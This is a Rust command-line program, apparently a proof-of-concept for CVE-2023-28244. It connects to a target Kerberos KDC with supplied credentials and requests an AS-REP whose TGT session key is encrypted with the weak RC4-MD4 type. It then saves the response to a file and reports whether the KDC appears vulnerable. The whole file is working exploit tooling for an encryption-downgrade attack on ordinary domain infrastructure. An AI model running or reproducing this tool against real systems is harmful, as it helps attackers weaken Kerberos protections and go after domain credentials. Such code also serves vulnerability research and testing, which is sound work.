use std::{io::{self, Write}, net::SocketAddr, path::PathBuf, fs::File};

use clap::Parser;
use cve_2023_28244::{AsReqExt, Client, KdcFrame, ERR_ETYPE_NOSUPP};
use rasn::der;
use rasn_kerberos::{AsReq, AsRep};

/// Utility for requesting AS_REP messages with RC4-MD4 encrypted TGT session key
#[derive(Debug, Parser)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Address:Port of target KDC
    target: SocketAddr,

    /// Realm
    #[arg(short, long)]
    realm: String,

    /// Username
    #[arg(short, long)]
    username: String,

    /// Password
    #[arg(short, long)]
    password: String,
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let args = Args::parse();
    let mut client = Client::connect(args.target).await?;
    let as_req = AsReq::new_rc4md4(
        args.realm.to_owned(),
        args.username.to_owned(),
        args.password.to_owned(),
    );
    let rep = client.send_as_req(as_req).await?;
    match rep {
        KdcFrame::AsRep(as_rep) => {
            write_asrep(&as_rep)?;
        }
        KdcFrame::KrbError(krb_error) if krb_error.error_code == ERR_ETYPE_NOSUPP => {
            println!("Received ERR_ETYPE_NOSUPP, KDC may not be vulnerable in current configuration")
        }
        _ => {
            println!("Received an unexpected response");
        }
    }
    Ok(())
}

fn write_asrep(as_rep: &AsRep) -> io::Result<()> {
    let path = PathBuf::from(format!(
        "asrep_{}.bin",
        as_rep.0.cname.string.iter().next().unwrap().as_str()
    ));
    let mut file = File::create(&path)?;
    let buf = der::encode(as_rep)
        .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "Failed to encode AsRep value"))?;
    file.write_all(&buf)?;
    println!("Wrote AsRep out to {}", &path.display());
    Ok(())
}
